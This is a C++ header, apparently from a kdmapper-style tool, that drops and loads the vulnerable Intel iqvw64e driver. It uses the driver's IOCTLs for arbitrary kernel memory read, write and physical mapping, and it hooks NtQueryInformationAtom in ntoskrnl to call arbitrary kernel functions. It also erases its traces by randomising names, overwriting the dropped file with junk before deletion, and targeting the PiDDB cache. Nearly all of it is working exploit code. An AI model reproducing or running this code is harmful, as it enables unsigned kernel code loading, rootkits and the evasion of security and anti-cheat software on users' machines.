#pragma once
#include <Windows.h>
#include <iostream>
#include <string>
#include <filesystem>
#include <atlstr.h>
#include <assert.h>

#include "intel_driver_resource.hpp"
#include "utils.hpp"

namespace intel_driver
{
	constexpr uint32_t ioctl1 = 0x80862007;
	constexpr DWORD iqvw64e_timestamp = 0x5284EAC3;

	typedef struct _COPY_MEMORY_BUFFER_INFO
	{
		uint64_t case_number;
		uint64_t reserved;
		uint64_t source;
		uint64_t destination;
		uint64_t length;
	}COPY_MEMORY_BUFFER_INFO, * PCOPY_MEMORY_BUFFER_INFO;

	typedef struct _FILL_MEMORY_BUFFER_INFO
	{
		uint64_t case_number;
		uint64_t reserved1;
		uint32_t value;
		uint32_t reserved2;
		uint64_t destination;
		uint64_t length;
	}FILL_MEMORY_BUFFER_INFO, * PFILL_MEMORY_BUFFER_INFO;

	typedef struct _GET_PHYS_ADDRESS_BUFFER_INFO
	{
		uint64_t case_number;
		uint64_t reserved;
		uint64_t return_physical_address;
		uint64_t address_to_translate;
	}GET_PHYS_ADDRESS_BUFFER_INFO, * PGET_PHYS_ADDRESS_BUFFER_INFO;

	typedef struct _MAP_IO_SPACE_BUFFER_INFO
	{
		uint64_t case_number;
		uint64_t reserved;
		uint64_t return_value;
		uint64_t return_virtual_address;
		uint64_t physical_address_to_map;
		uint32_t size;
	}MAP_IO_SPACE_BUFFER_INFO, * PMAP_IO_SPACE_BUFFER_INFO;

	typedef struct _UNMAP_IO_SPACE_BUFFER_INFO
	{
		uint64_t case_number;
		uint64_t reserved1;
		uint64_t reserved2;
		uint64_t virt_address;
		uint64_t reserved3;
		uint32_t number_of_bytes;
	}UNMAP_IO_SPACE_BUFFER_INFO, * PUNMAP_IO_SPACE_BUFFER_INFO;

	typedef struct _RTL_BALANCED_LINKS {
		struct _RTL_BALANCED_LINKS* Parent;
		struct _RTL_BALANCED_LINKS* LeftChild;
		struct _RTL_BALANCED_LINKS* RightChild;
		CHAR Balance;
		UCHAR Reserved[3];
	} RTL_BALANCED_LINKS;
	typedef RTL_BALANCED_LINKS* PRTL_BALANCED_LINKS;

	typedef struct _RTL_AVL_TABLE {
		RTL_BALANCED_LINKS BalancedRoot;
		PVOID OrderedPointer;
		ULONG WhichOrderedElement;
		ULONG NumberGenericTableElements;
		ULONG DepthOfTree;
		PVOID RestartKey;
		ULONG DeleteCount;
		PVOID CompareRoutine;
		PVOID AllocateRoutine;
		PVOID FreeRoutine;
		PVOID TableContext;
	} RTL_AVL_TABLE;
	typedef RTL_AVL_TABLE* PRTL_AVL_TABLE;

	typedef struct _PiDDBCacheEntry
	{
		LIST_ENTRY		List;
		UNICODE_STRING	DriverName;
		ULONG			TimeDateStamp;
		NTSTATUS		LoadStatus;
		char			_0x0028[16]; // data from the shim engine, or uninitialized memory for custom drivers
	} PiDDBCacheEntry, * NPiDDBCacheEntry;

	typedef struct _HashBucketEntry
	{
		struct _HashBucketEntry* Next;
		UNICODE_STRING DriverName;
		ULONG CertHash[5];
	} HashBucketEntry, * PHashBucketEntry;

	inline char driver_name [ 256 ] = {};
	inline uintptr_t PiDDBLockPtr;
	inline uintptr_t PiDDBCacheTablePtr;

	__forceinline bool RegisterAndStart ( const std::string& driver_path )
	{
		const static DWORD ServiceTypeKernel = 1;
		const std::string driver_name = std::filesystem::path ( driver_path ).filename ( ).string ( );
		const std::string servicesPath = "SYSTEM\\CurrentControlSet\\Services\\" + driver_name;
		const std::string nPath = "\\??\\" + driver_path;

		HKEY dservice;
		LSTATUS status = RegCreateKeyA ( HKEY_LOCAL_MACHINE, servicesPath.c_str ( ), &dservice ); //Returns Ok if already exists
		if ( status != ERROR_SUCCESS )
		{
			return false;
		}

		status = RegSetKeyValueA ( dservice, NULL, "ImagePath", REG_EXPAND_SZ, nPath.c_str ( ), ( DWORD ) nPath.size ( ) );
		if ( status != ERROR_SUCCESS )
		{
			RegCloseKey ( dservice );
			return false;
		}

		status = RegSetKeyValueA ( dservice, NULL, "Type", REG_DWORD, &ServiceTypeKernel, sizeof ( DWORD ) );
		if ( status != ERROR_SUCCESS )
		{
			RegCloseKey ( dservice );
			return false;
		}

		RegCloseKey ( dservice );

		HMODULE ntdll = GetModuleHandleA ( "ntdll.dll" );
		if ( ntdll == NULL ) {
			return false;
		}

		auto RtlAdjustPrivilege = ( nt::RtlAdjustPrivilege ) GetProcAddress ( ntdll, "RtlAdjustPrivilege" );
		auto NtLoadDriver = ( nt::NtLoadDriver ) GetProcAddress ( ntdll, "NtLoadDriver" );

		ULONG SE_LOAD_DRIVER_PRIVILEGE = 10UL;
		BOOLEAN SeLoadDriverWasEnabled;
		NTSTATUS Status = RtlAdjustPrivilege ( SE_LOAD_DRIVER_PRIVILEGE, TRUE, FALSE, &SeLoadDriverWasEnabled );
		if ( !NT_SUCCESS ( Status ) )
		{
			return false;
		}

		std::wstring wdriver_name ( driver_name.begin ( ), driver_name.end ( ) );
		wdriver_name = L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\" + wdriver_name;
		UNICODE_STRING serviceStr;
		RtlInitUnicodeString ( &serviceStr, wdriver_name.c_str ( ) );

		Status = NtLoadDriver ( &serviceStr );
		return NT_SUCCESS ( Status );
	}

	__forceinline bool StopAndRemove ( const std::string& driver_name )
	{
		HMODULE ntdll = GetModuleHandleA ( "ntdll.dll" );
		if ( ntdll == NULL )
			return false;

		std::wstring wdriver_name ( driver_name.begin ( ), driver_name.end ( ) );
		wdriver_name = L"\\Registry\\Machine\\System\\CurrentControlSet\\Services\\" + wdriver_name;
		UNICODE_STRING serviceStr;
		RtlInitUnicodeString ( &serviceStr, wdriver_name.c_str ( ) );

		HKEY driver_service;
		std::string servicesPath = "SYSTEM\\CurrentControlSet\\Services\\" + driver_name;
		LSTATUS status = RegOpenKeyA ( HKEY_LOCAL_MACHINE, servicesPath.c_str ( ), &driver_service );
		if ( status != ERROR_SUCCESS )
		{
			if ( status == ERROR_FILE_NOT_FOUND ) {
				return true;
			}
			return false;
		}
		RegCloseKey ( driver_service );

		auto NtUnloadDriver = ( nt::NtUnloadDriver ) GetProcAddress ( ntdll, "NtUnloadDriver" );
		NTSTATUS st = NtUnloadDriver ( &serviceStr );

		if ( st != 0x0 ) {

		}


		status = RegDeleteKeyA ( HKEY_LOCAL_MACHINE, servicesPath.c_str ( ) );
		if ( status != ERROR_SUCCESS )
		{
			return false;
		}

		return true;
	}

	__forceinline bool IsRunning ( )
	{
		const HANDLE file_handle = CreateFileW ( L"\\\\.\\Nal", FILE_ANY_ACCESS, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr );
		if ( file_handle != nullptr && file_handle != INVALID_HANDLE_VALUE )
		{
			CloseHandle ( file_handle );
			return true;
		}
		return false;
	}

	__forceinline HANDLE Load ( ) {
		//Randomize name for log in registry keys, usn jornal and other shits
		memset ( intel_driver::driver_name, 0, sizeof ( intel_driver::driver_name ) );
		static const char alphanum [ ] =
			"abcdefghijklmnopqrstuvwxyz"
			"ABCDEFGHIJKLMNOPQRSTUVWXYZ";
		int len = rand ( ) % 20 + 10;

		for ( int i = 0; i < len; ++i )
			intel_driver::driver_name [ i ] = alphanum [ rand ( ) % ( sizeof ( alphanum ) - 1 ) ];

		char temp_directory [ MAX_PATH ] = { 0 };
		const uint32_t get_temp_path_ret = GetTempPathA ( sizeof ( temp_directory ), temp_directory );

		if ( !get_temp_path_ret || get_temp_path_ret > MAX_PATH )
		{
			return nullptr;
		}
		if ( temp_directory [ strlen ( temp_directory ) - 1 ] == '\\' )
			temp_directory [ strlen ( temp_directory ) - 1 ] = 0x0;
		const std::string driver_path = std::string ( temp_directory ) + "\\" + driver_name;
		std::remove ( driver_path.c_str ( ) );

		if ( !utils::CreateFileFromMemory ( driver_path, reinterpret_cast< const char* >( intel_driver_resource::driver ), sizeof ( intel_driver_resource::driver ) ) ) {
			return nullptr;
		}

		if ( !RegisterAndStart ( driver_path ) ) {
			std::remove ( driver_path.c_str ( ) );
			return nullptr;
		}

		return CreateFileW ( L"\\\\.\\Nal", GENERIC_READ | GENERIC_WRITE, 0, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL );
	}

	__forceinline void Unload ( HANDLE device_handle ) {
		if ( device_handle && device_handle != INVALID_HANDLE_VALUE )
			CloseHandle ( device_handle );

		StopAndRemove ( driver_name );

		char temp_directory [ MAX_PATH ] = { 0 };

		const uint32_t get_temp_path_ret = GetTempPathA ( sizeof ( temp_directory ), temp_directory );
		if ( temp_directory [ strlen ( temp_directory ) - 1 ] == '\\' )
			temp_directory [ strlen ( temp_directory ) - 1 ] = 0x0;
		const std::string driver_path = std::string ( temp_directory ) + "\\" + driver_name;

		//Destroy disk information before unlink from disk to prevent any recover of the file
		std::ofstream file_ofstream ( driver_path.c_str ( ), std::ios_base::out | std::ios_base::binary );
		int newFileLen = sizeof ( intel_driver_resource::driver ) + ( ( long long ) rand ( ) % 2348767 + 56725 );
		BYTE* randomData = new BYTE [ newFileLen ];

		for ( size_t i = 0; i < newFileLen; i++ )
			randomData [ i ] = ( BYTE ) ( rand ( ) % 255 );

		if ( !file_ofstream.write ( ( char* ) randomData, newFileLen ) ) {

		}
		else {

		}

		file_ofstream.close ( );
		delete [ ] randomData;

		//unlink the file
		std::remove ( driver_path.c_str ( ) );
	}

	__forceinline bool MemCopy ( HANDLE device_handle, uint64_t destination, uint64_t source, uint64_t size )
	{
		if ( !destination || !source || !size )
			return 0;

		COPY_MEMORY_BUFFER_INFO copy_memory_buffer = { 0 };

		copy_memory_buffer.case_number = 0x33;
		copy_memory_buffer.source = source;
		copy_memory_buffer.destination = destination;
		copy_memory_buffer.length = size;

		DWORD bytes_returned = 0;
		return DeviceIoControl ( device_handle, ioctl1, &copy_memory_buffer, sizeof ( copy_memory_buffer ), nullptr, 0, &bytes_returned, nullptr );
	}

	__forceinline bool SetMemory ( HANDLE device_handle, uint64_t address, uint32_t value, uint64_t size )
	{
		if ( !address || !size )
			return 0;

		FILL_MEMORY_BUFFER_INFO fill_memory_buffer = { 0 };

		fill_memory_buffer.case_number = 0x30;
		fill_memory_buffer.destination = address;
		fill_memory_buffer.value = value;
		fill_memory_buffer.length = size;

		DWORD bytes_returned = 0;
		return DeviceIoControl ( device_handle, ioctl1, &fill_memory_buffer, sizeof ( fill_memory_buffer ), nullptr, 0, &bytes_returned, nullptr );
	}

	__forceinline bool GetPhysicalAddress ( HANDLE device_handle, uint64_t address, uint64_t* out_physical_address )
	{
		if ( !address )
			return 0;

		GET_PHYS_ADDRESS_BUFFER_INFO get_phys_address_buffer = { 0 };

		get_phys_address_buffer.case_number = 0x25;
		get_phys_address_buffer.address_to_translate = address;

		DWORD bytes_returned = 0;

		if ( !DeviceIoControl ( device_handle, ioctl1, &get_phys_address_buffer, sizeof ( get_phys_address_buffer ), nullptr, 0, &bytes_returned, nullptr ) )
			return false;

		*out_physical_address = get_phys_address_buffer.return_physical_address;
		return true;
	}

	__forceinline uint64_t MapIoSpace ( HANDLE device_handle, uint64_t physical_address, uint32_t size )
	{
		if ( !physical_address || !size )
			return 0;

		MAP_IO_SPACE_BUFFER_INFO map_io_space_buffer = { 0 };

		map_io_space_buffer.case_number = 0x19;
		map_io_space_buffer.physical_address_to_map = physical_address;
		map_io_space_buffer.size = size;

		DWORD bytes_returned = 0;

		if ( !DeviceIoControl ( device_handle, ioctl1, &map_io_space_buffer, sizeof ( map_io_space_buffer ), nullptr, 0, &bytes_returned, nullptr ) )
			return 0;

		return map_io_space_buffer.return_virtual_address;
	}

	__forceinline bool UnmapIoSpace ( HANDLE device_handle, uint64_t address, uint32_t size )
	{
		if ( !address || !size )
			return false;

		UNMAP_IO_SPACE_BUFFER_INFO unmap_io_space_buffer = { 0 };

		unmap_io_space_buffer.case_number = 0x1A;
		unmap_io_space_buffer.virt_address = address;
		unmap_io_space_buffer.number_of_bytes = size;

		DWORD bytes_returned = 0;

		return DeviceIoControl ( device_handle, ioctl1, &unmap_io_space_buffer, sizeof ( unmap_io_space_buffer ), nullptr, 0, &bytes_returned, nullptr );
	}

	__forceinline bool ReadMemory ( HANDLE device_handle, uint64_t address, void* buffer, uint64_t size )
	{
		return MemCopy ( device_handle, reinterpret_cast< uint64_t >( buffer ), address, size );
	}

	__forceinline bool WriteMemory ( HANDLE device_handle, uint64_t address, void* buffer, uint64_t size )
	{
		return MemCopy ( device_handle, address, reinterpret_cast< uint64_t >( buffer ), size );
	}

	__forceinline bool WriteToReadOnlyMemory ( HANDLE device_handle, uint64_t address, void* buffer, uint32_t size )
	{
		if ( !address || !buffer || !size )
			return false;

		uint64_t physical_address = 0;

		if ( !GetPhysicalAddress ( device_handle, address, &physical_address ) )
		{
			return false;
		}

		const uint64_t mapped_physical_memory = MapIoSpace ( device_handle, physical_address, size );

		if ( !mapped_physical_memory )
		{
			return false;
		}

		bool result = WriteMemory ( device_handle, mapped_physical_memory, buffer, size );

		if ( !UnmapIoSpace ( device_handle, mapped_physical_memory, size ) ) {

		}

		return result;
	}

	__forceinline uint64_t GetKernelModuleExport ( HANDLE device_handle, uint64_t kernel_module_base, const std::string& function_name )
	{
		if ( !kernel_module_base )
			return 0;

		IMAGE_DOS_HEADER dos_header = { 0 };
		IMAGE_NT_HEADERS64 nt_headers = { 0 };

		if ( !ReadMemory ( device_handle, kernel_module_base, &dos_header, sizeof ( dos_header ) ) || dos_header.e_magic != IMAGE_DOS_SIGNATURE ||
			!ReadMemory ( device_handle, kernel_module_base + dos_header.e_lfanew, &nt_headers, sizeof ( nt_headers ) ) || nt_headers.Signature != IMAGE_NT_SIGNATURE )
			return 0;

		const auto export_base = nt_headers.OptionalHeader.DataDirectory [ IMAGE_DIRECTORY_ENTRY_EXPORT ].VirtualAddress;
		const auto export_base_size = nt_headers.OptionalHeader.DataDirectory [ IMAGE_DIRECTORY_ENTRY_EXPORT ].Size;

		if ( !export_base || !export_base_size )
			return 0;

		const auto export_data = reinterpret_cast< PIMAGE_EXPORT_DIRECTORY >( VirtualAlloc ( nullptr, export_base_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE ) );

		if ( !ReadMemory ( device_handle, kernel_module_base + export_base, export_data, export_base_size ) )
		{
			VirtualFree ( export_data, 0, MEM_RELEASE );
			return 0;
		}

		const auto delta = reinterpret_cast< uint64_t >( export_data ) - export_base;

		const auto name_table = reinterpret_cast< uint32_t* >( export_data->AddressOfNames + delta );
		const auto ordinal_table = reinterpret_cast< uint16_t* >( export_data->AddressOfNameOrdinals + delta );
		const auto function_table = reinterpret_cast< uint32_t* >( export_data->AddressOfFunctions + delta );

		for ( auto i = 0u; i < export_data->NumberOfNames; ++i )
		{
			const std::string current_function_name = std::string ( reinterpret_cast< char* >( name_table [ i ] + delta ) );

			if ( !_stricmp ( current_function_name.c_str ( ), function_name.c_str ( ) ) )
			{
				const auto function_ordinal = ordinal_table [ i ];
				const auto function_address = kernel_module_base + function_table [ function_ordinal ];

				if ( function_address >= kernel_module_base + export_base && function_address <= kernel_module_base + export_base + export_base_size )
				{
					VirtualFree ( export_data, 0, MEM_RELEASE );
					return 0; // No forwarded exports on 64bit?
				}

				VirtualFree ( export_data, 0, MEM_RELEASE );
				return function_address;
			}
		}

		VirtualFree ( export_data, 0, MEM_RELEASE );
		return 0;
	}

	template<typename T, typename ...A>
	__forceinline bool CallKernelFunction ( HANDLE device_handle, T* out_result, uint64_t kernel_function_address, const A ...arguments )
	{
		constexpr auto call_void = std::is_same_v<T, void>;

		if constexpr ( !call_void )
		{
			if ( !out_result )
				return false;
		}
		else
		{
			UNREFERENCED_PARAMETER ( out_result );
		}

		if ( !kernel_function_address )
			return false;

		// Setup function call
		HMODULE ntdll = GetModuleHandle ( "ntdll.dll" );
		if ( ntdll == 0 ) {
			return false;
		}

		const auto NtQueryInformationAtom = reinterpret_cast< void* >( GetProcAddress ( ntdll, "NtQueryInformationAtom" ) );
		if ( !NtQueryInformationAtom )
		{
			return false;
		}

		uint8_t kernel_injected_jmp [ ] = { 0x48, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xff, 0xe0 };
		uint8_t original_kernel_function [ sizeof ( kernel_injected_jmp ) ];
		*( uint64_t* ) &kernel_injected_jmp [ 2 ] = kernel_function_address;

		const uint64_t kernel_NtQueryInformationAtom = GetKernelModuleExport ( device_handle, utils::GetKernelModuleAddress ( "ntoskrnl.exe" ), "NtQueryInformationAtom" );
		if ( !kernel_NtQueryInformationAtom )
		{
			return false;
		}

		if ( !ReadMemory ( device_handle, kernel_NtQueryInformationAtom, &original_kernel_function, sizeof ( kernel_injected_jmp ) ) )
			return false;

		// Overwrite the pointer with kernel_function_address
		if ( !WriteToReadOnlyMemory ( device_handle, kernel_NtQueryInformationAtom, &kernel_injected_jmp, sizeof ( kernel_injected_jmp ) ) )
			return false;

		// Call function
		if constexpr ( !call_void )
		{
			using FunctionFn = T ( __stdcall* )( A... );
			const auto Function = reinterpret_cast< FunctionFn >( NtQueryInformationAtom );

			*out_result = Function ( arguments... );
		}
		else
		{
			using FunctionFn = void ( __stdcall* )( A... );
			const auto Function = reinterpret_cast< FunctionFn >( NtQueryInformationAtom );

			Function ( arguments... );
		}

		// Restore the pointer/jmp
		WriteToReadOnlyMemory ( device_handle, kernel_NtQueryInformationAtom, original_kernel_function, sizeof ( kernel_injected_jmp ) );
		return true;
	}

	__forceinline uintptr_t FindPatternAtKernel ( HANDLE device_handle, uintptr_t dwAddress, uintptr_t dwLen, BYTE* bMask, char* szMask ) {
		if ( !dwAddress ) {
			return 0;
		}

		if ( dwLen > 1024 * 1024 * 1024 ) { //if read is > 1GB
			return 0;
		}

		BYTE* sectionData = new BYTE [ dwLen ];
		ReadMemory ( device_handle, dwAddress, sectionData, dwLen );

		auto result = utils::FindPattern ( ( uintptr_t ) sectionData, dwLen, bMask, szMask );

		if ( result <= 0 ) {
			delete [ ] sectionData;
			return 0;
		}
		result = dwAddress + result - ( uintptr_t ) sectionData;
		delete [ ] sectionData;
		return result;
	}

	__forceinline uintptr_t FindSectionAtKernel ( HANDLE device_handle, char* sectionName, uintptr_t modulePtr, PULONG size ) {
		if ( !modulePtr )
			return 0;
		BYTE headers [ 0x1000 ];
		if ( !ReadMemory ( device_handle, modulePtr, headers, 0x1000 ) ) {
			return 0;
		}
		ULONG sectionSize = 0;
		uintptr_t section = ( uintptr_t ) utils::FindSection ( sectionName, ( uintptr_t ) headers, &sectionSize );
		if ( !section || !sectionSize ) {
			return false;
		}
		if ( size )
			*size = sectionSize;
		return section - ( uintptr_t ) headers + modulePtr;
	}

	__forceinline uintptr_t FindPatternInSectionAtKernel ( HANDLE device_handle, char* sectionName, uintptr_t modulePtr, BYTE* bMask, char* szMask ) {
		ULONG sectionSize = 0;
		uintptr_t section = FindSectionAtKernel ( device_handle, sectionName, modulePtr, &sectionSize );
		return FindPatternAtKernel ( device_handle, section, sectionSize, bMask, szMask );
	}

	__forceinline uint64_t AllocatePool ( HANDLE device_handle, nt::POOL_TYPE pool_type, uint64_t size )
	{
		if ( !size )
			return 0;

		static uint64_t kernel_ExAllocatePool = GetKernelModuleExport ( device_handle, utils::GetKernelModuleAddress ( "ntoskrnl.exe" ), "ExAllocatePoolWithTag" );

		if ( !kernel_ExAllocatePool )
		{
			return 0;
		}

		uint64_t allocated_pool = 0;

		if ( !CallKernelFunction ( device_handle, &allocated_pool, kernel_ExAllocatePool, pool_type, size, 'ases' ) )
			return 0;

		return allocated_pool;
	}

	__forceinline bool FreePool ( HANDLE device_handle, uint64_t address )
	{
		if ( !address )
			return 0;

		static uint64_t kernel_ExFreePool = GetKernelModuleExport ( device_handle, utils::GetKernelModuleAddress ( "ntoskrnl.exe" ), "ExFreePool" );

		if ( !kernel_ExFreePool ) {
			return 0;
		}

		return CallKernelFunction<void> ( device_handle, nullptr, kernel_ExFreePool, address );
	}

	__forceinline PVOID ResolveRelativeAddress ( HANDLE device_handle, _In_ PVOID Instruction, _In_ ULONG OffsetOffset, _In_ ULONG InstructionSize ) {
		ULONG_PTR Instr = ( ULONG_PTR ) Instruction;
		LONG RipOffset = 0;
		if ( !ReadMemory ( device_handle, Instr + OffsetOffset, &RipOffset, sizeof ( LONG ) ) ) {
			return nullptr;
		}
		PVOID ResolvedAddr = ( PVOID ) ( Instr + InstructionSize + RipOffset );
		return ResolvedAddr;
	}
}
